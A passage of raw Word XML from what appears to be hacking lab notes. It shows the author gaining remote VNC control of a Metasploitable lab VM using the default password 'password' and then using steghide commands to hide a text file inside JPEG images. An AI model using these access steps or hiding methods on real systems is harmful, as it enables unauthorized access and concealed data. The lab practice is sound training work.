          <w:highlight w:val="white"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Now we can see that a VNC session has been created</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000000F4">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000000F5">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Now we need to go to a new tab of our kali linux and type</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000000F6">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000000F7">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">vncviewer  10.10.1.4</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000000F8">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000000F9">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48"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b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Then put the password “password”</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000000FB">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000000FC">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34"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bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">We can directly see the screen of METASPLOITABLE MACHINE ON KALI LINUX MACHINE</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000000FE">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000000FF">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="red"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="red"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">NOT ONLY WE CAN SEE BUT WE CAN CONTROL IT AS WELL</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000100">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000101">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91" name="image86.png"/>
            <a:graphic>
              <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/picture">
                <pic:pic>
                  <pic:nvPicPr>
                    <pic:cNvPr id="0" name="image86.png"/>
                    <pic:cNvPicPr preferRelativeResize="0"/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId5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bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">WE JUST TYPED IN ifconfig AND CAN SEE THE ip address without even going to the original machine but we can see it from the kali linux using vncviewer .</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000103">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000104">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2997200"/>
            <wp:effectExtent b="0" l="0" r="0" t="0"/>
            <wp:docPr id="79"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bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Now we can run our commands on it because it is a linux tool we can run linux commands and access all the sensitive information.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000106">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000107">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000108">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
          <w:highlight w:val="red"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
          <w:highlight w:val="red"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">USING STEGHIDE TO HIDE FILE/DOCUMENTS INSIDE ANY PICTURE OR IMAGE FILES</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000109">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
          <w:highlight w:val="red"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000010A">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53"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bCs w:val="1"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
          <w:highlight w:val="red"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000010C">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
          <w:highlight w:val="red"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
          <w:highlight w:val="red"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">We can see that we already downloaded a JPEG FILE named as srk.png and there is a text file named swakshar.txt </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000010D">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
          <w:highlight w:val="red"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000010E">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
          <w:highlight w:val="red"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
          <w:highlight w:val="red"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">So we will be hiding the text file swakshar.txt inside the image file srk.jpeg</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000010F">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
          <w:highlight w:val="red"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000110">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57"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b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
          <w:highlight w:val="red"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
          <w:highlight w:val="red"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">This is the info side the text file swakshar.txt</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000112">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
          <w:highlight w:val="red"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000113">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
          <w:highlight w:val="red"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
          <w:highlight w:val="red"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Now we will be hiding this file inside the image </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000114">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
          <w:highlight w:val="red"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
          <w:highlight w:val="red"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Srk.jpeg</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000115">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
          <w:highlight w:val="red"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000116">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
          <w:highlight w:val="red"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
          <w:highlight w:val="red"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Command: steghide embed -cf srk.jpeg -ef swakshar.txt </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000117">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
          <w:highlight w:val="red"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000118">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73"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bCs w:val="1"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
          <w:highlight w:val="red"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
          <w:highlight w:val="red"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Now we have to enter a temporary password to make sure while extracting the data from the picture file we should have a security protocol</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000011A">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
          <w:highlight w:val="red"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000011B">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
          <w:highlight w:val="red"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
          <w:highlight w:val="red"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">paraphrase:[***********]</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000011C">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
          <w:highlight w:val="red"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000011D">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14"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1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
          <w:highlight w:val="red"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
          <w:highlight w:val="red"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">It shows that the image file is too short to hide the file</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000011F">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
          <w:highlight w:val="red"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000120">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
          <w:highlight w:val="red"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
          <w:highlight w:val="red"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">So we will select another picture file named </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000121">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
          <w:highlight w:val="red"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
          <w:highlight w:val="red"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">lion.jpeg</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000122">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
          <w:highlight w:val="red"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000123">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
          <w:highlight w:val="red"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
          <w:highlight w:val="red"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Command: steghide embed -cf lion.jpeg -ef swakshar.txt</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000124">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
          <w:highlight w:val="red"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000125">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
          <w:highlight w:val="red"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
          <w:highlight w:val="red"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">paraphrase:[*********]</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000126">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
          <w:highlight w:val="red"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000127">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37"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bCs w:val="1"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
          <w:highlight w:val="red"/>
        </w:rPr>
      </w:pPr>
